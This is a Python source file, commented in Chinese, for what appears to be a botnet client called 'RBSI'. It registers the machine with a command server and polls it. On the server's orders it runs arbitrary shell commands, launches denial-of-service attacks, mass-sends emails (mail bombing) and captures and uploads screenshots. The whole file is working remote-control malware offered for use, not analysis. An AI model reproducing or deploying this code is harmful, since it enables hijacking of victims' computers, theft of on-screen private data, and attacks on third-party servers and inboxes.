# 该文件无需自定义

import requests
from socket import gethostname
import subprocess
import sys
import time
import uuid
import random
import zmail
import threading
import pyautogui  # pip install pyautogui==0.9.50

import DDOS

url = sys.argv[1]
# 全局变量初始化
for i in range(1, 10):
    url = sys.argv[i]
    if url[:4] == "http":
        break


action = -1


class CmdTread(threading.Thread):
    def __init__(self, cmdL):
        super(CmdTread, self).__init__()
        self.cmd = cmdL
        self.start()

    def run(self):
        subprocess.call(self.cmd,
                        shell=True,
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)


def send_mail(from_address,
              from_password,
              to_address,
              title="RBSI发送的问候",
              content="这是来自RBSI程序发送的问候。",
              from_name="RBSI"):
    # 邮件轰炸函数
    mail_content = {
        "subject":
        title,
        "content_html":
        "<p>%s</p><br /><p>本次发信识别码：%s %s</p>" %
        (content, random.random(), time.time()),
        "from":
        "%s <%s>" % (from_name, from_address)
    }

    server = zmail.server(from_address, from_password)
    try:
        server.send_mail([to_address], mail_content)
        return True
    except:
        return False


def init():
    # 初始化与服务端的通讯
    global action
    while True:
        print(url)
        try:
            r = requests.post(url + "init", data={"name": name}).json()
            action = r["action"]
            print("服务器通讯初始化成功！")
            send_message("初始化成功！")
            return
        except KeyboardInterrupt:
            print("服务器通讯初始化失败！15秒后重新尝试...")
            time.sleep(15)


def send_message(message):
    requests.post(url + "message", data={"name": name, "message": message})


mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
mac = "-".join([mac[e:e + 2] for e in range(0, 11, 2)])
name = gethostname() + "_" + mac
print("当前设备名称：" + name)

init()

while True:
    try:
        while True:
            data = {"name": name, "action": action}
            response = requests.post(url + "connect", data=data)
            response = response.json()
            print(response)

            waited = False

            if response.get("stop-once"):
                send_message("stop-once执行")
                raise SystemExit
            if response.get("stop-forever"):
                # 需要联动
                send_message("stop-forever执行")
                raise SystemExit

            if response.get("show-version"):
                send_message("go_install版本不支持显示版本")

            action = response["action"]
            if response["actions"]:
                send_message("开始执行命令...")
                for i in response["actions"]:
                    if "all" not in i["send_to"] and name not in i["send_to"]:
                        continue
                    CmdTread(i["command"])
                send_message("命令执行成功！")

            if response["DDOS"]["do"]:
                DDOS.run(times=response["DDOS"]["times"],
                         host=response["DDOS"]["host"],
                         page=response["DDOS"]["page"],
                         port=response["DDOS"]["port"])
                send_message("DDOS线程启动")

            if response["mail-attack"]["do"]:
                if response["mail-attack"]["easy"]:
                    for i in range(response["mail-attack"]["times"]):
                        send_mail(
                            from_address=response["mail-attack"]
                            ["from-address"],
                            from_password=response["mail-attack"]
                            ["from-password"],
                            to_address=response["mail-attack"]["to-address"])
                else:
                    for i in range(response["mail-attack"]["times"]):
                        send_mail(
                            from_address=response["mail-attack"]
                            ["from-address"],
                            from_password=response["mail-attack"]
                            ["from-password"],
                            to_address=response["mail-attack"]["to-address"],
                            from_name=response["mail-attack"]["from-name"],
                            title=response["mail-attack"]["title"],
                            content=response["mail-attack"]["content"])
                raise ConnectionError

            if response.get("getScreen"):
                send_message("尝试截图...")
                pyautogui.screenshot("Screenshot.png")
                requests.post(url + "upload",
                              data={"name": name},
                              files={"file": open("Screenshot.png", "rb")})
                send_message("截图成功！")

            if not waited:
                time.sleep(5)

    except ConnectionError:
        send_message("邮件轰炸成功发送！")
    except SystemExit:
        send_message("尝试退出...")
        raise SystemExit
    except KeyboardInterrupt:
        send_message("尝试退出...")
        raise SystemExit
    except:
        print("未知错误！程序即将重新初始化...")
        init()
